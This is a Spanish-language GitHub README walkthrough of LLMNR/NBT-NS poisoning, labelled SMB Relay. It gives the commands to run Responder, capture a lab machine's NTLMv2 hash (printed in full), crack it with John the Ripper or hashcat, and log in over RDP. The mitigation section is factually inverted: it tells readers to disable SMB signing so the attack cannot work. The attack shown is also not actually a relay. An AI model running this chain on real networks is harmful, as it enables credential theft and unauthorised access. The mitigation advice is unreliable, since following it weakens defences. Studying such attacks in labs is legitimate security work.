<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?color=D1F700FF&width=480&lines=Envenenamiento+LMMNR%2FNBT-NS+%5BSMB-Relay%5D"></a>
</p>

<h1 align="center"></h1>

El ataque SMB Relay es un ataque muy utilizado para ganar acceso a equipos privilegiados y no privilegiados. En las redes existen sistemas automatizados que se conectan a otros equipos para realizar diversas tareas tipo: backups, actualizar antivirus y controladores, revisar inventario del software instalado y demás. Dichos sistemas para conectarse a otros equipos necesitan proveer a los mismos las credenciales válidas para llevar a cabo la autenticación. Y aquí es donde viene lo jugoso, el atacante lo que hace es interceptar las conexiones entre esos sistemas (con su dirección IP interna/local) para capturar el usuario y contraseña, en el caso de la contraseña, viajará hasheada.

La autenticación se realiza por medio del protocolo NTLM, mismo que contiene un hash para almacenar las contraseñas de sistemas Windows.

![1](https://user-images.githubusercontent.com/75953873/180976862-a5c4eaf9-7d77-4768-8f39-f9865e771f35.png)

Ataque intermediario (**MITM**) - Envenenamiento

`User A`: Envía un mensaje de autenticación al `User B`

`Atacante`: Intercepta primero el mensaje y lo pasa al `User B`

`User B`: Recibe el mensaje y envía el desafío encriptado en un hash hacia el `User A`

`User A`: Resuelve el desafío y lo envía hacia el `User B`

`Atacante`: Intercepta el desafío (**hash**)

`User B`: Decide si otorgar acceso o denegarlo

El atacante graba el Hash-SMB para luego crackear el login por fuerza bruta.
<h1 align="center"></h1>

### RESPONDER

Una de las herramientas que suelo utilizar personalmente es Responder, un script hecho en python para envenenar (escuchar) las autenticaciones que viajan en la red, tales como: HTTP/SMB/MSSQL/FTP/LDAP/NTLMv1/NTLMv2/LMv2. Para descargar el repositorio ejecutan el siguiente comando:
```
git clone https://github.com/SpiderLabs/Responder && cd Responder
```

Para poner en marcha las escuchas:
```python
python2 Responder.py -I <INTERFAZ> -w -r -f -v 
```

**-I**: Interfaz de red.

**-w**: Inicie el servidor proxy no autorizado WPAD. El valor predeterminado es falso.

**-r**: Habilitar las respuestas para las consultas de sufijo wredir de netbios. Responder a wredir probablemente rompa cosas en la red. Valor predeterminado: falso.

**-f**: Esta opción le permite tomar la huella digital de un host que emitió una consulta NBT-NS o LLMNR.

**-v**: Modo verbose (más detalles).

![2](https://user-images.githubusercontent.com/75953873/180978707-5b9ef34e-746e-4f1e-9fd7-d4ef51f6c649.png)

En mi caso, escogí Windows 7 a explotar como entorno controlado en una VM. Lo probé en mi máquina física con Windows 10 y funciono sin problemas. En Windows me dirigí a Explorador de archivos **->** Acceso rápido y en la barra de búsqueda escribí `//printserver`, es un servidor que conecta una impresora de red al sistema que la esté autenticando.

![3](https://user-images.githubusercontent.com/75953873/180978928-092e50a1-b266-4613-9035-74d8d0f2c1ec.png)

Del lado de la atacante, pueden observar como la herramienta ha capturado el usuario y el hash de sesión:

![4](https://user-images.githubusercontent.com/75953873/180979200-362d6ba3-1ca2-4999-aef0-d5e284b242d2.png)

NTLMv2 hash:
```
Windows7::WIN-L4EQ22AUEQQ:1122334455667788:7D9F243618A9F7D0A67E33C32CAD0F6D:01010000000000007B1A5D1F4184D80165B72B4E1C351E52000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000010000000020000042D1DCB967E565082DB9764DD27D0466D49D29CCB6AE09136F0E9AF0C8420BA60A001000000000000000000000000000000000000900200048005400540050002F007000720069006E0074007300650072007600650072000000000000000000
```

Luego, creó un nuevo documento de texto en donde almacenaré el hash, posteriormente usaré John The Ripper para crackearlo:
```
john --wordlist=<diccionario> <hash_almacenado.txt>
```
![5](https://user-images.githubusercontent.com/75953873/180979714-50fe079f-9eb3-42cf-aec9-e501662a9576.png)

Si su máquina cuenta con un procesador de decente, entonces opten a utilizar hashcat para crackear el hash:
```
hashcat -m 5600 <hash_almacenado.txt> <diccionario.txt>
```
**5600** es el identificador del hash NTLMv2.

![6](https://user-images.githubusercontent.com/75953873/180979999-0db7f067-4b36-4011-97df-6bf33e740ffd.png)

CREDENCIALES DE LA MÁQUINA

Usuario: `Windows7`

Contraseña: `admin123`

Por último, me conectaré de forma remota a la máquina con el software de Rdesktop.
```
rdesktop <IP-host>
```
![7](https://user-images.githubusercontent.com/75953873/180980398-e6ac228d-2166-4a89-a08b-6d37d4570585.png)

</br>

<h2 align="center">¡ACCESO OTORGADO!</h2>

![8](https://user-images.githubusercontent.com/75953873/180981807-efa34f76-e1e6-447a-94f0-475f01c74011.png)

<h1 align="center"></h1>

</br>

#### MITIGAR VULNERABILIDAD

Lo primero que recomiendo es entrar a la configuraciones de Conexiones remota de Windows y deshabilitarla, o solo habilitarla para aquellos equipos de confianza.

![9](https://user-images.githubusercontent.com/75953873/180982098-3a64da13-f408-44d9-b48a-1606445e9271.png)

De parte de la empresa es recomendable limitar las cuentas de usuarios administradores locales y del dominio para no producir un daño mayor, así como también deshabilitar la firma SMB para que el ataque no pueda funcionar.



#### ~R3LI4NT~
